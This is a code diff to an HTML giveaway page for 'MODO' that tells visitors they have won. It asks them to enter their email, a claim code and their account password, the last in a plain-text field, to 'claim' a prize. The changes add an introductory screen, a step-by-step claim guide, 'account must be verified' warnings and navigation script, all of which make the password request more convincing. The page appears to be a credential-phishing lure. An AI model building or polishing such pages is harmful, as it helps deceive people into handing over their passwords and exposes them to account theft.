@@ -11,13 +11,108 @@
     <div class="blob blob-1"></div>
     <div class="blob blob-2"></div>
 
-    <div class="card">
+    <section id="welcome" class="card transition-fade">
       <h1 class="big-heading grad-text">MODO giveaway</h1>
       <p class="eyebrow">Limited time</p>
       <h2 class="title">You're a winner!</h2>
       <p class="subtitle">
-        Enter the name, email and password you used to enter the giveaway to
-        claim your prize.
+        Follow the short guide below and you'll have your reward claimed in under
+        a minute.
+      </p>
+
+      <div class="notice">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 9v4" /><path d="M12 17h.01" /><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z" /></svg>
+        <span><strong>Account must be verified</strong> to qualify for the reward.</span>
+      </div>
+
+      <div class="welcome-actions">
+        <button id="start-btn" class="btn btn-block">See how to claim</button>
+        <button id="skip-quick-btn" class="btn btn-ghost btn-block">Skip to claim now</button>
+      </div>
+
+      <a class="get-started" href="https://modo.us" target="_blank" rel="noopener">
+        Get started at modo.us
+      </a>
+    </section>
+
+    <section id="roadmap" class="card transition-fade" style="display: none">
+      <h2 class="title" style="margin-top: 0">How to claim your reward</h2>
+      <p class="subtitle">Tap a step to expand it.</p>
+
+      <div class="steps">
+        <div class="step">
+          <button class="step-head" type="button">
+            <span class="step-num">1</span>
+            <span class="step-title">Verify your entry</span>
+            <span class="step-chev" aria-hidden="true">▼</span>
+          </button>
+          <div class="step-body">
+            <div class="step-body-inner">
+              Go to the official giveaway site (<a href="https://modo.us" target="_blank" rel="noopener">modo.us</a>)
+              and sign in with the account you used to enter. Confirm your details
+              are correct.
+              <p class="step-note">
+                Only accounts that are <strong>verified</strong> qualify. Unverified
+                entries are rejected.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <button class="step-head" type="button">
+            <span class="step-num">2</span>
+            <span class="step-title">Get your claim code</span>
+            <span class="step-chev" aria-hidden="true">▼</span>
+          </button>
+          <div class="step-body">
+            <div class="step-body-inner">
+              Ask the host for your claim code, or dig out the code you received
+              when you joined. Keep it close — you'll need it below to generate
+              your personal claim ID.
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <button class="step-head" type="button">
+            <span class="step-num">3</span>
+            <span class="step-title">Generate your claim ID</span>
+            <span class="step-chev" aria-hidden="true">▼</span>
+          </button>
+          <div class="step-body">
+            <div class="step-body-inner">
+              Enter your email, claim code and password on the next screen. We'll
+              generate a unique 5-digit claim ID just for you.
+            </div>
+          </div>
+        </div>
+
+        <div class="step">
+          <button class="step-head" type="button">
+            <span class="step-num">4</span>
+            <span class="step-title">Claim your reward</span>
+            <span class="step-chev" aria-hidden="true">▼</span>
+          </button>
+          <div class="step-body">
+            <div class="step-body-inner">
+              Tick the verification box and hit <strong>Claim now</strong>. Your
+              entry is sent for review — the confirmation screen is the link to
+              your claim reward page.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <button id="continue-btn" class="btn btn-block">Continue to claim</button>
+      <button id="skip-road-btn" class="btn btn-ghost btn-block">Skip to claim now</button>
+    </section>
+
+    <section id="claim-card" class="card transition-fade" style="display: none">
+      <p class="eyebrow" style="margin-top: 0">MODO giveaway</p>
+      <h2 class="title" style="margin-top: 10px">Claim your reward</h2>
+      <p class="subtitle">
+        Enter your email, claim code and password, then claim your prize.
       </p>
 
       <form id="claim-form" class="form" novalidate>
@@ -34,6 +129,11 @@
           <input id="password" name="password" type="text" autocomplete="off" placeholder="e.g. jane_doe123" class="mono" />
         </div>
 
+        <div class="notice notice-sm">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 9v4" /><path d="M12 17h.01" /><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z" /></svg>
+          <span><strong>Account must be verified</strong> to qualify.</span>
+        </div>
+
         <div class="field-check">
           <label class="check" for="verified">
             <input id="verified" name="verified" type="checkbox" />
@@ -45,11 +145,9 @@
 
         <button id="submit-btn" type="submit" class="btn btn-block">Claim now</button>
       </form>
-    </div>
 
-    <a class="get-started" href="https://modo.us" target="_blank" rel="noopener">
-      Get started at modo.us
-    </a>
+      <button id="back-steps-btn" class="btn-back">← Back to the steps</button>
+    </section>
   </div>
 
   <div id="modal" class="modal-backdrop" style="display: none" role="dialog" aria-modal="true">
@@ -89,6 +187,44 @@
     const claimCodeInput = document.getElementById("claim-code");
     const copyCodeBtn = document.getElementById("copy-code");
     const copyMsg = document.getElementById("copy-msg");
+
+    const VIEWS = ["welcome", "roadmap", "claim-card"];
+
+    function hideView(el) {
+      el.classList.remove("section-visible");
+      setTimeout(() => {
+        if (!el.classList.contains("section-visible")) el.style.display = "none";
+      }, 400);
+    }
+
+    function showView(id) {
+      for (const v of VIEWS) {
+        const el = document.getElementById(v);
+        if (v === id) {
+          el.style.display = "block";
+          requestAnimationFrame(() =>
+            requestAnimationFrame(() => el.classList.add("section-visible"))
+          );
+        } else {
+          hideView(el);
+        }
+      }
+    }
+
+    document.getElementById("start-btn").addEventListener("click", () => showView("roadmap"));
+    document.getElementById("skip-quick-btn").addEventListener("click", () => showView("claim-card"));
+    document.getElementById("continue-btn").addEventListener("click", () => showView("claim-card"));
+    document.getElementById("skip-road-btn").addEventListener("click", () => showView("claim-card"));
+    document.getElementById("back-steps-btn").addEventListener("click", () => showView("roadmap"));
+
+    document.querySelectorAll(".step-head").forEach((head) => {
+      head.addEventListener("click", () => {
+        const step = head.closest(".step");
+        const wasOpen = step.classList.contains("open");
+        document.querySelectorAll(".step.open").forEach((s) => s.classList.remove("open"));
+        if (!wasOpen) step.classList.add("open");
+      });
+    });
 
     function showAlert(msg) {
       alertBox.textContent = msg;
@@ -179,6 +315,10 @@
         submitBtn.textContent = "Claim now";
       }
     });
+
+    requestAnimationFrame(() => requestAnimationFrame(() =>
+      document.getElementById("welcome").classList.add("section-visible")
+    ));
   </script>
 </body>
 </html>
